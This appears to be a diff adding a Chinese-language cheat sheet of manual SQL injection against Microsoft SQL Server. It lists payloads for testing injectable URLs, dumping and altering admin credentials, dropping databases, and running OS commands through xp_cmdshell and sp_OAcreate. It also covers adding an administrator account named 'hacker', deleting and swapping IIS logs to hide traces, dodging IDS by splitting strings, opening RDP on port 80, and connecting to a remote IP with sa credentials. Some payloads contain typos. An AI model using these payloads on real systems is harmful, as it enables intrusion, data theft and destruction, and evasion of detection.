@@ -1,0 +1,404 @@
+最新 手工MSSQL注入常用SQL语句 
+and exists (select * from sysobjects) //判断是否是MSSQL
+
+and exists(select * from tableName) //判断某表是否存在..tableName为表名
+
+and 1=(select @@VERSION) //MSSQL版本
+
+And 1=(select db_name()) //当前数据库名
+
+and 1=(select @@servername) //本地服务名
+
+and 1=(select IS_SRVROLEMEMBER('sysadmin')) //判断是否是系统管理员
+
+and 1=(Select IS_MEMBER('db_owner')) //判断是否是库权限
+
+and 1= (Select HAS_DBACCESS('master')) //判断是否有库读取权限
+
+and 1=(select name from master.dbo.sysdatabases where dbid=1) //暴库名DBID为1，2，3....
+
+;declare @d int //是否支持多行
+
+and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell') //判断XP_CMDSHELL是否存在
+
+and 1=(select count(*) FROM master.dbo.sysobjects where name= 'xp_regread') //查看XP_regread扩展存储过程是不是已经被删除
+
+添加和删除一个SA权限的用户test：（需要SA权限）
+exec master.dbo.sp_addlogin test,password
+exec master.dbo.sp_addsrvrolemember test,sysadmin
+
+停掉或激活某个服务。 （需要SA权限）
+exec master..xp_servicecontrol 'stop','schedule'
+exec master..xp_servicecontrol 'start','schedule'
+
+暴网站目录
+create table labeng(lala nvarchar(255), id int)
+
+DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots','/',@result output insert into labeng(lala) values(@result);
+
+and 1=(select top 1 lala from labeng) 或者and 1=(select count(*) from labeng where lala>1)
+—————————————————————————————————————————————————————分割
+
+DOS下开3389 并修改端口号
+sc config termservice start= auto
+
+net start termservice
+
+//允许外连
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f 
+
+//该3389端口到80
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 80 /f
+
+
+
+SQL Server
+
+
+判断是否可注射：
+
+http://www.targer.com/article.asp?id=6
+
+http://www.targer.com/article.asp?id=6'
+
+http://www.targer.com/article.asp?id=6 and 1=1
+
+http://www.targer.com/article.asp?id=6 and 1=2
+
+http://www.targer.com/article.asp?action=value' and 1=1
+
+http://www.targer.com/article.asp?action=value' and 1=2
+
+searchpoints%' and 1=1
+
+searchpoints%' and 1=2
+
+
+确定数据库类型：
+
+http://www.targer.com/article.asp?id=6 and user>0
+
+http://www.targer.com/article.asp?id=6 and (select count(*) from sysobjects)>0
+
+
+查询当前用户数据信息：
+
+article.asp?id=6 having 1=1--
+
+
+暴当前表中的列：
+
+article.asp?id=6 group by admin.username having 1=1--
+
+article.asp?id=6 group by admin.username,admin.password having 1=1--
+
+
+暴任意表和列：
+
+and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)>1
+
+and (select top col_name(object_id('admin'),N) from sysobjects)>1
+
+
+暴数据库数据：
+
+and (select top 1 password from admin where id=N)>1
+
+
+修改数据库中的数据：
+
+;update admin set password='oooooo' where username='xxx'
+
+
+增添数据库中的数据：
+
+;insert into admin values (xxx,oooooo)--
+
+
+删数据库：
+
+;drop database webdata
+
+
+获取当前数据库用户名：and user>0
+
+获取当前数据库名：and db_name()>0
+
+获取数据库版本：and (select @@version)>0
+
+
+判断是否支持多句查询：;declare @a int--
+
+判断是否支持子查询：and (select count(1) from [sysobjects])>=0
+
+
+数据库的扩展存储过程：exec master..xp_cmdshell
+
+查看服务器C盘目录：;exec_master..xp_cmdshell 'dir c:\'
+
+判断扩展存储过程是否存在：and select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
+
+删除扩展存储过程：;exec sp_dropextendedproc 'xp_cmdshell'
+恢复扩展存储过程：;exec sp_addextendedproc xp_cmdshell,'xplog70.dll'
+
+
+
+
+在MSSQL2000中提供了一些函数用于访问OLE对象间接获取权限：
+
+;declare @s int
+
+;exec sp_oacreat 'wscript.shell',@s
+
+;exec master..spoamethod @s,'run',null,'cmd.exe/c dir c:\'
+
+
+判断当前数据库用户名是否拥有比较高的权限：
+
+and 1=(select is_srvrolemember('sysadmin'))
+
+and 1=(select is_srvrolemember('serveradmin'))
+
+and 1=(select is_srvrolemember('setupadmin'))
+
+and 1=(select is_srvrolemember('securityadmin'))
+
+and 1=(select is_srvrolemember('diskadmin'))
+
+and 1=(select is_srvrolemember('bulkadmin'))
+
+
+判断当前数据库用户名是否为DB_OWNER：
+
+and 1=(select is_member('db_owner'))
+
+
+在SQLSERVER的master.dbo.sysdatabases表中存放着SQLSERVER数据库系统中的所有数据库信息，只需要PUBLIC权限就可以对此表进行SELECT操作：
+
+and (select top 1 name from master.dbo.sysdatabase order by dbid)>0
+
+and (select top 1 name from master.dbo.sysdatabase where name not in(select top 1 name from master.dbo.sysdatabases order by dbid) order by dbid)>0
+
+
+删除日志记录：
+
+;exec master.dbo.xp_cmdshell 'del c:\winnt\system32\logfiles\w3svc5\ex070606.log >c:\temp.txt'
+
+
+替换日志记录：
+
+;exec master.dbo.xp_cmdshell 'copy c:\winnt\system32\logfiles\w3svc5\ex070404.log c:\winnt\system32\logfiles\w3svc5\ex070606.log >c:\temp.txt'
+
+
+获取WEB路径：
+
+;declare @shell int
+
+;exec master..sp_oamethod 'wscript.shell',@shell out
+
+;exec master..sp_oamethod @shell,'run',null,'cmd.exe/c dir /s d:/index.asp >c:/log.txt
+
+
+利用XP_CMDSHELL搜索：
+
+;exec master..xp_cmdshell 'dir /s d:/index.asp'
+
+
+显示服务器网站配置信息命令：
+
+cmd /c cscript.exe c:\inetpub\adminscript\adsutil.vbs enum w3svc/1/root
+
+cmd /c cscript.exe c:\inetpub\adminscript\adsutil.vbs enum w3svc/2/root
+
+
+利用XP_REGREAD可用PUBLIC权限读取：
+
+;exec master.dbo.xp_regread
+
+hkey_local_machine,
+
+'system\currentcontrolset\services\w3svc\parameters\virtual roots\'
+
+'/'
+
+
+SQLSERVER下的高级技术可以参考阅读曾云好所著的精通脚本黑客第五章。
+
+
+3、DSqlHelper
+
+
+检测权限SYSADMIN：
+
+and 1=(select IS_SRVROLEMEMBER('sysadmin'))
+
+serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin、db_owner。
+
+
+检测XP_CMDSHELL（CMD命令）：
+
+and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_cmdshell')
+
+检测XP_REGREAD（注册表读取功能）：
+
+and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_regread')
+
+检测SP_MAKEWEBTASK（备份功能）：
+
+and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'sp_makewebtask')
+
+检测SP_ADDEXTENDEDPROC：
+
+and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'sp_addextendedproc')
+
+检测XP_SUBDIRS读子目录：
+
+and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_subdirs')
+
+检测XP_DIRTREE读子目录：
+
+and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_dirtree')
+
+
+修改内容：
+
+; UPDATE 表名 set 字段=内容 where 1=1
+
+
+XP_CMDSHELL检测：
+
+;exec master..xp_cmdshell 'dir c:\'
+
+修复XP_CMDSHELL：
+
+;exec master.dbo.sp_addextendedproc 'xp_cmdshell', 'xplog70.dll'
+
+用XP_CMDSHELL添加用户hacker：
+
+;exec master.dbo.xp_cmdshell 'net user hacker 123456 /add'
+
+XP_CMDSHELL把用户hacker加到ADMIN组：
+
+;exec master.dbo.xp_cmdshell 'net localgroup administrators hacker /add'
+
+
+创建表test：
+
+;create table [dbo].[test] ([dstr][char](255));
+
+检测表段test：
+
+and exists (select * from test)
+
+读取WEB的位置（读注册表）：
+
+;DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots', '/',@result output insert into test (dstr) values(@result);--
+
+爆出WEB的绝对路径（显错模式）：
+
+and 1=(select count(*) from test where dstr > 1)
+
+删除表test：
+
+;drop table test;--
+
+
+创建查看目录的表dirs：
+
+;create table dirs(paths varchar(100), id int)
+
+把查看目录的内容加入表dirs：
+
+;insert dirs exec master.dbo.xp_dirtree 'c:\'
+
+爆目录的内容dirs：
+
+and 0<>(select top 1 paths from dirs)
+
+备份数据库DATANAME：
+
+declare @a sysname; set @a=db_name();backup DATANAME @a to disk='c:\inetpub\wwwroot\down.bak';--
+
+删除表dirs：
+
+;drop table dirs;--
+
+
+创建表temp：
+
+;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
+
+把驱动盘列表加入temp表：
+
+;insert temp exec master.dbo.xp_availablemedia;--
+
+删除表temp：
+
+;delete from temp;--
+
+
+创建表dirs：
+
+;create table dirs(paths varchar(100), id int);--
+
+获得子目录列表XP_SUBDIRS：
+
+;insert dirs exec master.dbo.xp_subdirs 'c:\';--
+
+爆出内容（显错模式）：
+
+and 0<>(select top 1 paths from dirs)
+
+删除表dirs：
+
+;delete from dirs;--
+
+
+创建表dirs：
+
+;create table dirs(paths varchar(100), id int)--
+
+用XP_CMDSHELL查看目录内容：
+
+;insert dirs exec master..xp_cmdshell 'dir c:\'
+
+删除表dirs：
+
+;delete from dirs;--
+
+
+检测SP_OAcreate（执行命令）：
+
+and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'SP_OAcreate')
+
+SP_OAcreate执行CMD命令：
+
+;DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C:\WINNT\system32\cmd.exe /c net user hacker 123456 /add'
+
+SP_OAcreate建目录：
+
+;DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C:\WINNT\system32\cmd.exe /c md c:\inetpub\wwwroot\1111'
+
+创建一个虚拟目录E盘：
+
+;declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL,' cscript.exe c:\inetpub\wwwroot\mkwebdir.vbs -w "默认 Web 站点" -v "e","e:\"'
+
+设置虚拟目录E为可读：
+
+;declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL,' cscript.exe c:\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e +browse'
+
+启动SERVER服务：
+
+;exec master..xp_servicecontrol 'start', 'server'
+
+绕过IDS检测XP_CMDSHELL：
+
+;declare @a sysname set @a='xp_'+'cmdshell' exec @a 'dir c:\'
+
+开启远程数据库1：
+
+; select * from OPENROWSET('SQLOLEDB', 'server=servername;uid=sa;pwd=apachy_123', 'select * from table1' )
+
+开启远程数据库2：
+
+;select * from OPENROWSET('SQLOLEDB', 'uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;', 'select * from table'
